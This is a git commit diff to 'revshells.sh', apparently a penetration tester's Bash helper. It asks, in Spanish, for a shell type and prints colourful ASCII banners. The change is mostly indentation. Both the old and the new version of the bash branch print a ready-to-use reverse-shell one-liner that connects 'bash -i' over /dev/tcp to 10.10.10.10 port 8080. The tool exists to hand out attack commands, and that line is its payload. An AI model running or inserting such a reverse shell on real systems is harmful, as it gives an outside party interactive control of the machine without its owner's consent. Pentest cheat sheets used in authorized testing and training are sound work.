0fa854b84fa237c6ef31d201cac4afa60a18378b
Erik451 <47476901+PentestingAccount@users.noreply.github.com>
2021-03-24 17:20:28 +0100

    Update revshells.sh

--- revshells.sh
+++ revshells.sh
@@ -11,36 +11,36 @@ grayColour="\e[0;37m\033[1m"
 
 echo 
 #Pregunta por el tipo de shell
-echo -e "${purpleColour}[${yellowColour}*${purpleColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell
+echo -e "${purpleColour}[${yellowColour}*${purpleColour}]${turquoiseColour} Introduce el tipo de shell: ${endColour}"; read shell;
 
 #Reverse Shell Bash
 if [ "$shell" == "bash"]
 
 then
 
-echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
-sleep 0.05
-echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / __ )____ ______/ /_"
-sleep 0.05
-echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ `/ ___/ __ \"
-sleep 0.05
-echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /_/ / /_/ (__  ) / / /"
-sleep 0.05
-echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_____/\__,_/____/_/ /_/${endColour}"
+  echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
+  sleep 0.05
+  echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / __ )____ ______/ /_"
+  sleep 0.05
+  echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ / ___/ __ \"
+  sleep 0.05
+  echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /_/ / /_/ (__  ) / / /"
+  sleep 0.05
+  echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_____/\__,_/____/_/ /_/${endColour}"
                                                                                         
-echo -e "Use this: ${yellowColour} bash -i >& /dev/tcp/10.10.10.10/8080 0>&1 ${endColour}"
+  echo -e "Use this: ${yellowColour} bash -i >& /dev/tcp/10.10.10.10/8080 0>&1 ${endColour}"
 
 #Reverse Shell Netcat
 elif [ "$shell" == "netcat"]
 
 then
 
-echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
-sleep 0.05
-echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / | / /__  / /__________ _/ /"
-sleep 0.05
-echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ `/ ___/ __ \"
-sleep 0.05
-echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /|  /  __/ /_/ /__/ /_/ / /"
-sleep 0.05
-echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_/ |_/\___/\__/\___/\__,_/\__/${endColour}"
+  echo -e "${redColour}    ____                                   _____ __         ____   ____             __"
+  sleep 0.05
+  echo -e "   / __ \___ _   _____  _____________     / ___// /_  ___  / / /  / | / /__  / /__________ _/ /"
+  sleep 0.05
+  echo -e "  / /_/ / _ \ | / / _ \/ ___/ ___/ _ \    \__ \/ __ \/ _ \/ / /  / __  / __ / ___/ __ \"
+  sleep 0.05
+  echo -e " / _, _/  __/ |/ /  __/ /  (__  )  __/   ___/ / / / /  __/ / /  / /|  /  __/ /_/ /__/ /_/ / /"
+  sleep 0.05
+  echo -e "/_/ |_|\___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/  /_/ |_/\___/\__/\___/\__,_/\__/${endColour}"
